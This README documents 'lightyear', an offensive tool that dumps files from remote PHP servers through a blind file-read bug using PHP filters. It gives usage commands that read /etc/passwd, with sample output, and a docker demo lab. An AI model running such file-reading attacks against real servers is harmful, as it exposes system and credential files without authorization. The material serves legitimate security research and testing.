# lightyear

A tool to dump files in tedious (blind) conditions using PHP filters, by [cfreal](https://twitter.com/cfreal_). It can be used to dump any file using a blind file read primitive in PHP, such as:

```php
get_image_size($_GET['image']);
```

# Usage

## Setup

```bash
$ git clone https://github.com/ambionics/lightyear
$ cd lightyear
$ pip install -r requirements.txt
```

To use, implement the `Remote.oracle()` method, and then test that it works properly by running `./lightyear.py test`.

```bash
$ ./lightyear test # test that your implementation works
```

If it does, you are good to go.


## Dumping files

The `test` command will tell you if the remote server supports compression. If it does, use `-c` to drastically speed up the file dump.

```bash
$ ./lightyear.py -c /etc/passwd # dump a file with compression!
```

Otherwise, dump the file without compression (slower):

```bash
$ ./lightyear.py /etc/passwd # dump a file!
```

By default, lightyear uses *3* threads to speed up the file dump. Due to the way the algorithm works, it is generally useless to use more. You can however use less using ``--threads``.

## Resuming

If you interrupt and then restart a dump with the same destination file, the dump will resume.

```bash
$ ./lightyear.py /etc/passwd -o /tmp/passwd.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:
<PRESSED CTRL-C>
>> Dumped /etc/passwd to /tmp/passwd.txt (got 243 digits, 390 bytes, 390 chars) (interrupted)
$ ./lightyear.py /etc/passwd -o /tmp/passwd.txt
[*] File exists, resuming dump at digit #243
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

>> Dumped /etc/passwd to /tmp/passwd.txt (got 413 digits, 839 bytes, 839 chars)
```


# Testing

A docker file is available in `demo/`. It provides a very simple Apache+PHP environment allowing you to test the tool.

```
$ docker build -t lightyear-demo ./demo
$ docker run -d --name lightyear-demo --rm -p 8000:80 lightyear-demo
$ ./lightyear.py /etc/passwd
```

# Improvements

- Improve jump caching to truly reach minimum size and compute faster
- Combine with [wrapwrap](https://github.com/ambionics/wrapwrap)

# References

- [Blogpost describing the tool](https://www.ambionics.io/blog/lightyear-file-dump)